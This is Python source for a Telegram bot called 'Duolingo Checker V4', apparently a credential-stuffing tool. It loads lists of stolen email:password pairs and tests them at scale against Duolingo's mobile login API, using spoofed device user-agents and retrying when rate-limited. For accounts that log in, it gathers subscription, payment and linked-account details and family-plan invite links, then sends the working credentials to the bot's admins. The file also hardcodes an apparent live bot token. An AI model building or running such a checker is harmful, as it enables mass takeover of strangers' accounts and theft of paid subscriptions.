import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import time
import uuid
import logging
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_IDS = [8770379893, 1859432548]
MAX_THREADS = 50
BATCH_SIZE = 10000
PROGRESS_INTERVAL = 1000
REQUEST_TIMEOUT = 20
MAX_RETRIES = 3
RETRY_DELAY = 2
# ===================================

logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

checking_active = False
stop_flag = False
current_executor = None
current_futures = None
check_lock = threading.Lock()

# Store hits
all_super_hits = []
all_family_hits = []
all_free_accounts = []
hits_per_page = 10

# Stats
super_count = 0
family_count = 0
free_count = 0
fail_count = 0

# Batch stats
last_batch_super = 0
last_batch_family = 0
last_batch_free = 0
last_batch_fail = 0

def is_admin(user_id):
    return user_id in ADMIN_IDS

def create_session():
    """Create a requests session with retry logic to prevent crashes"""
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=100,
        pool_maxsize=100
    )
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    import random
    versions = ["10", "11", "12", "13", "14"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro",
              "SM-S908B", "Pixel 8", "OnePlus 12", "Xiaomi 14", "SM-A546B"]
    return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(versions)}; {random.choice(models)} Build/RP1A.200720.012)"

# ========== LANGUAGE MAPPING ==========
LANG_MAP = {
    "en": "🇺🇸 English", "es": "🇪🇸 Spanish", "fr": "🇫🇷 French",
    "de": "🇩🇪 German", "it": "🇮🇹 Italian", "pt": "🇧🇷 Portuguese",
    "ja": "🇯🇵 Japanese", "ko": "🇰🇷 Korean", "zh": "🇨🇳 Chinese",
    "ru": "🇷🇺 Russian", "ar": "🇸🇦 Arabic", "hi": "🇮🇳 Hindi",
    "tr": "🇹🇷 Turkish", "nl": "🇳🇱 Dutch", "sv": "🇸🇪 Swedish",
    "pl": "🇵🇱 Polish", "uk": "🇺🇦 Ukrainian", "vi": "🇻🇳 Vietnamese",
    "th": "🇹🇭 Thai", "id": "🇮🇩 Indonesian", "el": "🇬🇷 Greek",
    "he": "🇮🇱 Hebrew", "ro": "🇷🇴 Romanian", "cs": "🇨🇿 Czech",
    "hu": "🇭🇺 Hungarian", "ga": "🇮🇪 Irish", "cy": "🏴 Welsh",
    "hv": "🐉 High Valyrian", "tlh": "🖖 Klingon", "la": "🏛 Latin",
    "eo": "🌍 Esperanto", "gn": "🇵🇾 Guarani", "yi": "✡️ Yiddish",
    "zu": "🇿🇦 Zulu", "sw": "🇰🇪 Swahili", "fi": "🇫🇮 Finnish",
    "da": "🇩🇰 Danish", "no": "🇳🇴 Norwegian",
}

def get_lang_name(code):
    return LANG_MAP.get(code, f"🌐 {code}")

# ========== PAYMENT METHOD DETECTION ==========
def detect_payment_method(data):
    subscription = data.get("subscription", {})
    shop_items = data.get("shopItems", [])

    # Check for trial
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        sku = sub_info.get("productId", "").lower()
        if "trial" in sku or "free" in sku:
            return "🎁 Free Trial"

    # Check payment processor
    if subscription:
        billing_info = subscription.get("billingInfo", {})
        if billing_info:
            processor = billing_info.get("paymentProcessor", "").lower()
            if "google" in processor:
                return "🟢 Google Play"
            elif "apple" in processor:
                return "🍎 Apple App Store"
            elif "paypal" in processor:
                return "💙 PayPal"
            elif "stripe" in processor or "braintree" in processor:
                return "💳 Credit Card"

    # Check purchase platform
    if subscription:
        platform = subscription.get("purchasePlatform", "").lower()
        if "google" in platform:
            return "🟢 Google Play"
        elif "apple" in platform or "ios" in platform:
            return "🍎 Apple App Store"
        elif "web" in platform:
            return "💳 Credit Card (Web)"

    # Check product ID patterns
    product_id = ""
    if subscription:
        product_id = subscription.get("productId", "")
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info.get("productId"):
            product_id = sub_info.get("productId", "")

    product_lower = product_id.lower()
    if "google" in product_lower or "android" in product_lower:
        return "🟢 Google Play"
    elif "apple" in product_lower or "ios" in product_lower or "itunes" in product_lower:
        return "🍎 Apple App Store"
    elif "web" in product_lower or "direct" in product_lower:
        return "💳 Credit Card (Web)"

    # Check receipt data
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        receipt = sub_info.get("receipt", {})
        if receipt:
            receipt_str = str(receipt).lower()
            if "google" in receipt_str:
                return "🟢 Google Play"
            elif "apple" in receipt_str or "itunes" in receipt_str:
                return "🍎 Apple App Store"

    if data.get("hasPlus") or data.get("has_item_premium_subscription"):
        return "💎 Premium (Unknown)"

    return "❓ Unknown"

# ========== SOCIAL LINKS DETECTION ==========
def detect_social_links(data):
    social_links = []

    linked_accounts = data.get("linkedAccounts", [])
    for account in linked_accounts:
        provider = account.get("provider", "").lower()
        if "google" in provider:
            social_links.append("🔴 Google")
        elif "facebook" in provider:
            social_links.append("🔵 Facebook")
        elif "apple" in provider:
            social_links.append("🍎 Apple ID")

    if data.get("hasFacebookId") and "🔵 Facebook" not in social_links:
        social_links.append("🔵 Facebook")
    if data.get("hasGoogleId") and "🔴 Google" not in social_links:
        social_links.append("🔴 Google")

    return social_links if social_links else ["❌ None"]

# ========== SUBSCRIPTION DETAILS ==========
def extract_subscription_details(data):
    details = {
        "product_id": "Unknown",
        "renewing": "Unknown",
        "expiry": "Unknown",
        "invite_token": None,
        "payment_method": "Unknown",
        "billing_cycle": "Unknown"
    }

    subscription = data.get("subscription", {})
    if subscription:
        if subscription.get("productId"):
            details["product_id"] = subscription.get("productId")
        if subscription.get("renewing") is not None:
            details["renewing"] = "✅ Yes" if subscription.get("renewing") else "❌ No"
        if subscription.get("expirationTime"):
            expiry_ms = subscription.get("expirationTime")
            if expiry_ms and expiry_ms > 1000000000000:
                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        elif subscription.get("expectedExpiration"):
            expiry_ms = subscription.get("expectedExpiration")
            if expiry_ms and expiry_ms > 1000000000000:
                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        if subscription.get("billingPeriod"):
            period = subscription.get("billingPeriod", "").lower()
            if "month" in period:
                details["billing_cycle"] = "📅 Monthly"
            elif "year" in period:
                details["billing_cycle"] = "📆 Yearly"

    shop_items = data.get("shopItems", [])
    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            if details["product_id"] == "Unknown" and sub_info.get("productId"):
                details["product_id"] = sub_info.get("productId")
            if details["renewing"] == "Unknown" and sub_info.get("renewing") is not None:
                details["renewing"] = "✅ Yes" if sub_info.get("renewing") else "❌ No"
            if details["expiry"] == "Unknown" and sub_info.get("expectedExpiration"):
                expiry_ms = sub_info.get("expectedExpiration")
                if expiry_ms and expiry_ms > 1000000000000:
                    details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")

        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            details["invite_token"] = family_info.get("inviteToken")

    details["payment_method"] = detect_payment_method(data)
    return details

def is_premium_account(data):
    shop_items = data.get("shopItems", [])

    for item in shop_items:
        family_info = item.get("familyPlanInfo", {})
        if family_info and family_info.get("inviteToken"):
            return True, "FAMILY", family_info.get("inviteToken")

    for item in shop_items:
        sub_info = item.get("subscriptionInfo", {})
        if sub_info:
            product_id = sub_info.get("productId", "")
            if "trial" in product_id.lower():
                continue
            if product_id and product_id != "N/A":
                return True, "SUPER", None

    subscription = data.get("subscription", {})
    if subscription:
        if subscription.get("productId") and "trial" not in subscription.get("productId", "").lower():
            return True, "SUPER", None

    if data.get("has_item_premium_subscription") == True:
        return True, "SUPER", None
    if data.get("hasPlus") == True:
        return True, "SUPER", None

    return False, "FREE", None

# ========== FORMAT HIT MESSAGE ==========
def format_hit_message(email, password, data, plan_type, sub_details, invite_token=None):
    """Beautiful formatted hit message with all requested info"""
    username = data.get("username", "N/A")
    total_xp = data.get("totalXp", 0)
    streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
    learning_lang = data.get("learningLanguage", "N/A")
    from_lang = data.get("fromLanguage", "N/A")

    created_at_raw = data.get("createdAt", None)
    if created_at_raw:
        try:
            if isinstance(created_at_raw, (int, float)):
                created_date = datetime.fromtimestamp(created_at_raw / 1000).strftime("%Y-%m-%d")
            else:
                created_date = str(created_at_raw)[:10]
        except:
            created_date = "Unknown"
    else:
        created_date = "Unknown"

    social_links = detect_social_links(data)
    social_text = " ┃ ".join(social_links)

    learning_display = get_lang_name(learning_lang)
    from_display = get_lang_name(from_lang)

    if invite_token:
        sub_details["invite_token"] = invite_token

    # Gems info
    gems = 0
    gems_config = data.get("gemsConfig", {})
    if gems_config:
        gems = gems_config.get("gems", 0)

    if plan_type == "FAMILY":
        header = "👨‍👩‍👧‍👦 FAMILY MANAGER"
        badge = "🏠"
    else:
        header = "👑 SUPER PREMIUM"
        badge = "💎"

    msg = f"""
{'━' * 38}
{badge}  {header}
{'━' * 38}

📧  `{email}:{password}`

╭─── 👤 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢 ────────────────╮
│  🏷  Username: {username}
│  ⭐  XP: {total_xp:,}
│  🔥  Streak: {streak} days
│  💎  Gems: {gems:,}
│  📅  Joined: {created_date}
╰────────────────────────────────────╯

╭─── 📚 𝗟𝗘𝗔𝗥𝗡𝗜𝗡𝗚 ──────────────────╮
│  🎯  Learning: {learning_display}
│  🏠  From: {from_display}
╰────────────────────────────────────╯

╭─── 💳 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 ────────────────╮
│  📦  Product: `{sub_details['product_id']}`
│  💰  Payment: {sub_details['payment_method']}
│  🔄  Billing: {sub_details['billing_cycle']}
│  🔁  Auto-Renew: {sub_details['renewing']}
│  ⏰  Expires: {sub_details['expiry']}
╰────────────────────────────────────╯

╭─── 🔗 𝗦𝗢𝗖𝗜𝗔𝗟 𝗟𝗜𝗡𝗞𝗦 ────────────────╮
│  {social_text}
╰────────────────────────────────────╯"""

    if plan_type == "FAMILY" and sub_details.get("invite_token"):
        invite_link = f"https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
        msg += f"""

╭─── 🔗 𝗙𝗔𝗠𝗜𝗟𝗬 𝗜𝗡𝗩𝗜𝗧𝗘 ────────────────╮
│  🎟  `{invite_link}`
╰────────────────────────────────────╯"""
    elif plan_type == "FAMILY":
        msg += f"""

╭─── 🔗 𝗙𝗔𝗠𝗜𝗟𝗬 𝗜𝗡𝗩𝗜𝗧𝗘 ────────────────╮
│  ⚠️  No invite token found
╰────────────────────────────────────╯"""

    msg += f"""

{'━' * 38}
🦉 Checked by: 𝗧𝗛𝗨𝗬𝗔 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟰
{'━' * 38}"""

    return msg

# ========== CHECK SINGLE ACCOUNT ==========
def check_single_account(email, password):
    if stop_flag:
        return email, password, "STOPPED", None, None

    session = create_session()
    ua = generate_ua()

    for attempt in range(MAX_RETRIES):
        try:
            login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
            distinct_id = str(uuid.uuid4())

            login_payload = {
                "distinctId": distinct_id,
                "identifier": email,
                "password": password
            }

            login_headers = get_headers(ua)
            login_headers["Content-Type"] = "application/json"

            resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=REQUEST_TIMEOUT)

            if resp.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue

            if resp.status_code != 200:
                return email, password, "FAIL", "wrong credentials", None

            login_data = resp.json()
            user_id = login_data.get("id")
            if not user_id:
                return email, password, "FAIL", "no user id", None

            jwt_token = None
            for cookie in session.cookies:
                if cookie.name == "jwt_token":
                    jwt_token = cookie.value
                    break

            if not jwt_token:
                return email, password, "FAIL", "no jwt token", None

            profile_url = (
                f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}"
                f"?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage"
                f"%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription"
                f"%2CcreatedAt%2ClinkedAccounts%2ChasFacebookId%2ChasGoogleId"
                f"%2Csubscription%2Cprofile%2Ccourses"
            )

            profile_headers = get_headers(ua, jwt_token)
            resp2 = session.get(profile_url, headers=profile_headers, timeout=REQUEST_TIMEOUT)

            if resp2.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue

            if resp2.status_code != 200:
                return email, password, "FAIL", f"profile error {resp2.status_code}", None

            data = resp2.json()

            is_premium, plan_type, invite_token = is_premium_account(data)

            if not is_premium:
                username = data.get("username", "N/A")
                total_xp = data.get("totalXp", 0)
                streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
                return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}", None

            sub_details = extract_subscription_details(data)

            result = format_hit_message(email, password, data, plan_type, sub_details, invite_token)

            return email, password, "HIT", result, plan_type

        except requests.exceptions.ConnectionError:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "connection error", None
        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "timeout", None
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", str(e)[:40], None
        except Exception as e:
            logging.error(f"Unexpected error for {email}: {e}")
            return email, password, "FAIL", str(e)[:40], None
        finally:
            session.close()

    return email, password, "FAIL", "max retries exceeded", None

# ========== MENU & UI ==========
def send_main_menu(chat_id):
    total_hits = len(all_super_hits) + len(all_family_hits)
    status = "🟢 IDLE" if not checking_active else "🔴 CHECKING"

    menu_text = f"""
{'━' * 38}
🦉  𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟰
{'━' * 38}

╭─── ℹ️ 𝗜𝗡𝗙𝗢 ──────────────────────╮
│  👑  Owner: @thuyaaungzaw
│  🤖  Bot: Premium Checker V4
│  📡  Status: {status}
╰────────────────────────────────────╯

╭─── ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 ─────────────────────╮
│  🧵  Threads: {MAX_THREADS}
│  🔄  Auto-Retry: {MAX_RETRIES}x
│  📊  Update: Every {PROGRESS_INTERVAL}
╰────────────────────────────────────╯

╭─── 📈 𝗧𝗢𝗗𝗔𝗬'𝗦 𝗛𝗜𝗧𝗦 ───────────────╮
│  👑  Super: {super_count}
│  👨‍👩‍👧  Family: {family_count}
│  💾  Total Saved: {total_hits}
╰────────────────────────────────────╯
"""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 START CHECK", callback_data="start_check"),
        InlineKeyboardButton("📊 STATS", callback_data="my_stats")
    )
    markup.row(
        InlineKeyboardButton("💾 VIEW HITS", callback_data="view_hits"),
        InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
    )
    markup.row(
        InlineKeyboardButton("❌ CLOSE", callback_data="close_panel")
    )

    bot.send_message(chat_id, menu_text, parse_mode='Markdown', reply_markup=markup)

def send_hits_list(chat_id, page=0):
    total_hits = len(all_super_hits) + len(all_family_hits)
    if total_hits == 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
        bot.send_message(chat_id, "📭 No premium hits yet.\n\n📎 Send a combo file to start!", parse_mode='Markdown', reply_markup=markup)
        return

    all_hits = []
    for email, pwd, result in all_super_hits:
        all_hits.append(("👑 SUPER", email, pwd, result))
    for email, pwd, result in all_family_hits:
        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd, result))

    total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
    page = max(0, min(page, total_pages - 1))

    start = page * hits_per_page
    end = min(start + hits_per_page, len(all_hits))

    hit_list_text = ""
    for i, item in enumerate(all_hits[start:end], start=start + 1):
        plan, email, pwd, result = item
        # Extract key info from result
        lines = result.split('\n')
        username = xp = streak = expiry = payment = "?"
        for line in lines:
            if '🏷  Username:' in line:
                username = line.split('Username:')[1].strip()[:15]
            elif '⭐  XP:' in line:
                xp = line.split('XP:')[1].strip()
            elif '🔥  Streak:' in line:
                streak = line.split('Streak:')[1].replace('days', '').strip()
            elif '⏰  Expires:' in line:
                expiry = line.split('Expires:')[1].strip()
            elif '💰  Payment:' in line:
                payment = line.split('Payment:')[1].strip()[:18]

        hit_list_text += f"""╭─ [{i}] {plan}
│ 📧 `{email[:25]}...`
│ 👤 {username} ┃ ⭐ {xp} ┃ 🔥 {streak}d
│ 💳 {payment} ┃ ⏰ {expiry}
╰{'─' * 35}
"""

    message_text = f"""
{'━' * 38}
💾  𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧𝗦
{'━' * 38}

👑 Super: {len(all_super_hits)}  ┃  👨‍👩‍👧 Family: {len(all_family_hits)}
📄 Page {page + 1}/{total_pages}

{hit_list_text}
💡 Tap EXPORT to get full details
"""

    markup = InlineKeyboardMarkup(row_width=3)
    buttons = []
    if page > 0:
        buttons.append(InlineKeyboardButton("◀️ Prev", callback_data=f"hits_page_{page - 1}"))
    buttons.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        buttons.append(InlineKeyboardButton("Next ▶️", callback_data=f"hits_page_{page + 1}"))
    markup.row(*buttons)
    markup.row(
        InlineKeyboardButton("📋 EXPORT ALL", callback_data="copy_all_hits"),
        InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits")
    )
    markup.row(
        InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")
    )

    bot.send_message(chat_id, message_text, parse_mode='Markdown', reply_markup=markup)

def send_stats(chat_id):
    total_hits = len(all_super_hits) + len(all_family_hits)
    total_checked = super_count + family_count + free_count + fail_count
    hit_rate = round(total_hits / total_checked * 100, 2) if total_checked > 0 else 0

    stats_text = f"""
{'━' * 38}
📊  𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦
{'━' * 38}

╭─── 🎯 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 ─────────────────────╮
│  👑  Super Premium : {super_count:,}
│  👨‍👩‍👧  Family Plan   : {family_count:,}
│  ⚠️  Free Accounts : {free_count:,}
│  ❌  Failed        : {fail_count:,}
╰────────────────────────────────────╯

╭─── 📈 𝗧𝗢𝗧𝗔𝗟𝗦 ─────────────────────╮
│  📋  Checked : {total_checked:,}
│  🎯  Hits    : {total_hits:,}
│  📊  Rate    : {hit_rate}%
╰────────────────────────────────────╯

╭─── ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 ─────────────────────╮
│  🧵  Threads  : {MAX_THREADS}
│  🔄  Retries  : {MAX_RETRIES}x
│  📡  Status   : {'🔴 CHECKING' if checking_active else '🟢 IDLE'}
╰────────────────────────────────────╯
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
    bot.send_message(chat_id, stats_text, parse_mode='Markdown', reply_markup=markup)

# ========== CALLBACK HANDLER ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    global MAX_THREADS, MAX_RETRIES, checking_active, stop_flag, current_executor, current_futures
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits

    try:
        if call.data == "start_check":
            bot.answer_callback_query(call.id)
            if checking_active:
                bot.send_message(call.message.chat.id, "⚠️ Check already running! Use /stop first.")
                return
            bot.send_message(call.message.chat.id,
                f"""
╭─── 📎 𝗨𝗣𝗟𝗢𝗔𝗗 𝗖𝗢𝗠𝗕𝗢𝗦 ────────────────╮
│
│  Send your combo file (.txt)
│  Format: email:password
│
│  One combo per line
│
╰────────────────────────────────────╯""",
                parse_mode='Markdown')

        elif call.data == "my_stats":
            bot.answer_callback_query(call.id)
            send_stats(call.message.chat.id)

        elif call.data == "view_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "tools":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🧵 THREADS", callback_data="thread_settings"),
                InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="clear_hits")
            )
            markup.row(
                InlineKeyboardButton("🔄 RETRY COUNT", callback_data="retry_settings")
            )
            markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
            bot.send_message(call.message.chat.id, f"""
╭─── ⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ─────────────────────╮
│  🧵  Threads: {MAX_THREADS}
│  🔄  Retries: {MAX_RETRIES}x
│  ⏱  Timeout: {REQUEST_TIMEOUT}s
╰────────────────────────────────────╯""",
                parse_mode='Markdown', reply_markup=markup)

        elif call.data == "thread_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=4)
            markup.row(
                InlineKeyboardButton("10", callback_data="set_threads_10"),
                InlineKeyboardButton("20", callback_data="set_threads_20"),
                InlineKeyboardButton("30", callback_data="set_threads_30"),
                InlineKeyboardButton("50", callback_data="set_threads_50")
            )
            markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🧵 Current: `{MAX_THREADS}` threads\n\nSelect:", parse_mode='Markdown', reply_markup=markup)

        elif call.data == "retry_settings":
            bot.answer_callback_query(call.id)
            markup = InlineKeyboardMarkup(row_width=3)
            markup.row(
                InlineKeyboardButton("1x", callback_data="set_retry_1"),
                InlineKeyboardButton("3x", callback_data="set_retry_3"),
                InlineKeyboardButton("5x", callback_data="set_retry_5")
            )
            markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
            bot.send_message(call.message.chat.id, f"🔄 Current: `{MAX_RETRIES}x` retries\n\nSelect:", parse_mode='Markdown', reply_markup=markup)

        elif call.data.startswith("set_threads_"):
            new_threads = int(call.data.split("_")[2])
            MAX_THREADS = new_threads
            bot.answer_callback_query(call.id, f"✅ Threads → {new_threads}")
            send_main_menu(call.message.chat.id)

        elif call.data.startswith("set_retry_"):
            MAX_RETRIES = int(call.data.split("_")[2])
            bot.answer_callback_query(call.id, f"✅ Retries → {MAX_RETRIES}x")
            send_main_menu(call.message.chat.id)

        elif call.data == "clear_hits":
            bot.answer_callback_query(call.id)
            all_super_hits.clear()
            all_family_hits.clear()
            super_count = 0
            family_count = 0
            free_count = 0
            fail_count = 0
            bot.send_message(call.message.chat.id, "✅ All data cleared!")
            send_main_menu(call.message.chat.id)

        elif call.data == "main_menu":
            bot.answer_callback_query(call.id)
            send_main_menu(call.message.chat.id)

        elif call.data == "close_panel":
            bot.answer_callback_query(call.id)
            try:
                bot.delete_message(call.message.chat.id, call.message.message_id)
            except:
                pass

        elif call.data == "noop":
            bot.answer_callback_query(call.id)

        elif call.data == "refresh_hits":
            bot.answer_callback_query(call.id)
            send_hits_list(call.message.chat.id, 0)

        elif call.data == "copy_all_hits":
            bot.answer_callback_query(call.id)
            all_hits_text = f"🦉 DUOLINGO PREMIUM HITS\n{'═' * 40}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"

            for email, pwd, result in all_super_hits:
                all_hits_text += result + "\n\n"
            for email, pwd, result in all_family_hits:
                all_hits_text += result + "\n\n"

            if all_hits_text.strip():
                if len(all_hits_text) > 4000:
                    parts = [all_hits_text[i:i + 4000] for i in range(0, len(all_hits_text), 4000)]
                    for i, part in enumerate(parts):
                        bot.send_message(call.message.chat.id, f"📋 Part {i + 1}/{len(parts)}:\n```\n{part}```", parse_mode='Markdown')
                else:
                    bot.send_message(call.message.chat.id, f"📋 All Hits:\n```\n{all_hits_text}```", parse_mode='Markdown')
            else:
                bot.send_message(call.message.chat.id, "📭 No hits to export.")

        elif call.data.startswith("hits_page_"):
            page = int(call.data.split("_")[2])
            send_hits_list(call.message.chat.id, page)

    except Exception as e:
        logging.error(f"Callback error: {e}")
        try:
            bot.answer_callback_query(call.id, "⚠️ Error occurred")
        except:
            pass

# ========== PROCESS COMBOS ==========
def process_combos(chat_id, combos):
    global checking_active, stop_flag, current_executor, current_futures
    global super_count, family_count, free_count, fail_count
    global all_super_hits, all_family_hits, all_free_accounts
    global last_batch_super, last_batch_family, last_batch_free, last_batch_fail

    with check_lock:
        checking_active = True
        stop_flag = False

    super_count = 0
    family_count = 0
    free_count = 0
    fail_count = 0
    all_super_hits = []
    all_family_hits = []
    all_free_accounts = []

    last_batch_super = 0
    last_batch_family = 0
    last_batch_free = 0
    last_batch_fail = 0

    total = len(combos)
    completed = 0
    start_time = time.time()
    last_update = 0

    status_msg = bot.send_message(chat_id, f"""
╭─── 🚀 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚 ─────────────────────╮
│  📋  Combos: {total:,}
│  🧵  Threads: {MAX_THREADS}
│  🔄  Retries: {MAX_RETRIES}x
╰────────────────────────────────────╯""")

    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            current_executor = executor
            futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
            current_futures = futures

            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break

                completed += 1
                percent = (completed / total) * 100
                elapsed = time.time() - start_time

                try:
                    result = future.result(timeout=60)
                    if len(result) == 5:
                        email, password, status, detail, plan_type = result
                    else:
                        continue
                except Exception as e:
                    fail_count += 1
                    last_batch_fail += 1
                    continue

                if status == "HIT":
                    if plan_type == "FAMILY":
                        family_count += 1
                        last_batch_family += 1
                        all_family_hits.append((email, password, detail))
                    else:
                        super_count += 1
                        last_batch_super += 1
                        all_super_hits.append((email, password, detail))

                    try:
                        bot.send_message(chat_id, detail, parse_mode='Markdown')
                    except Exception as e:
                        logging.error(f"Failed to send hit: {e}")
                        try:
                            bot.send_message(chat_id, detail)
                        except:
                            pass

                    logging.info(f"✅ HIT: {email} ({plan_type})")
                elif status == "FREE":
                    free_count += 1
                    last_batch_free += 1
                elif status == "STOPPED":
                    break
                else:
                    fail_count += 1
                    last_batch_fail += 1

                if completed - last_update >= PROGRESS_INTERVAL or completed == total:
                    last_update = completed
                    bar_length = int(percent / 5)
                    progress_bar = "█" * bar_length + "░" * (20 - bar_length)
                    speed = completed / elapsed if elapsed > 0 else 0
                    eta = (total - completed) / speed if speed > 0 else 0

                    progress_text = f"""
{'━' * 38}
🦉  𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚...
{'━' * 38}

⏱  {elapsed:.0f}s  ┃  🚀 {int(speed)}/s  ┃  ⏳ ETA: {int(eta)}s

[{progress_bar}] {percent:.1f}%
📊 {completed:,} / {total:,}

╭─── 🎯 𝗛𝗜𝗧𝗦 ──────────────────────╮
│  👑  Super  : {super_count:,}
│  👨‍👩‍👧  Family : {family_count:,}
│  ⚠️  Free   : {free_count:,}
│  ❌  Fail   : {fail_count:,}
╰────────────────────────────────────╯

📈 Last {PROGRESS_INTERVAL}: 👑+{last_batch_super} 👨‍👩‍👧+{last_batch_family} ⚠️+{last_batch_free} ❌+{last_batch_fail}

⚡ /stop to cancel
"""
                    try:
                        bot.edit_message_text(progress_text, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
                    except:
                        pass

                    last_batch_super = 0
                    last_batch_family = 0
                    last_batch_free = 0
                    last_batch_fail = 0

    except Exception as e:
        logging.error(f"Process error: {e}\n{traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ Error occurred: {str(e)[:100]}\nBut hits are saved!")

    elapsed = time.time() - start_time
    total_hits = super_count + family_count
    hit_rate = round(total_hits / total * 100, 2) if total > 0 else 0

    final_text = f"""
{'━' * 38}
✅  𝗖𝗛𝗘𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
{'━' * 38}

⏱  Time: {elapsed:.1f}s  ┃  📋 Total: {total:,}

╭─── 🎯 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 ────────────────╮
│  👑  Super  : {super_count:,}
│  👨‍👩‍👧  Family : {family_count:,}
│  ⚠️  Free   : {free_count:,}
│  ❌  Fail   : {fail_count:,}
╰────────────────────────────────────╯

🎯 Hit Rate: {hit_rate}%
💾 Click 💾 VIEW HITS to see results
"""
    bot.send_message(chat_id, final_text, parse_mode='Markdown')
    send_main_menu(chat_id)

    with check_lock:
        checking_active = False
        stop_flag = False
        current_executor = None
        current_futures = None

